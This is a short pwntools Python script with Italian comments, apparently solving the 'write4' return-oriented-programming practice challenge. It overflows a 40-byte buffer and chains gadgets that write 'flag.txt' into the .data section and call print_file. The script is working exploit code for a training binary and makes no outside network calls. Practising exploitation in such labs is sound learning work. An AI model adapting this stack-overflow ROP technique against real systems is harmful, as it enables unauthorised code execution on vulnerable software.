from pwn import *
print = p64(0x00400510)         # print_file@plt
data = p64(0x00601028)          # indirizzo della sezione .data
where_mov = p64(0x0000000000400628)  # gadget mov [r14], r15 ; ret
what_flag = b"flag.txt"         # stringa da scrivere
rop1_r1415 = p64(0x0000000000400690) # gadget pop r14 ; pop r15 ; ret
rop2_rdi = p64(0x0000000000400693)   # gadget pop rdi ; ret
rop_onlyret = p64(0x00000000004004e6) # gadget ret (riallineamento)
offset = b"a"*40
# ROP chain costruita passo passo
rop = (
    offset +
    rop_onlyret +          # allineamento
    rop1_r1415 + data + what_flag +   # r14=.data, r15="flag.txt"
    where_mov +            # scrivi "flag.txt" in .data
    rop2_rdi + data +      # rdi = indirizzo .data
    print                  # chiama print_file(.data)
)
e = process("./write4")
e.sendline(rop)
e.interactive()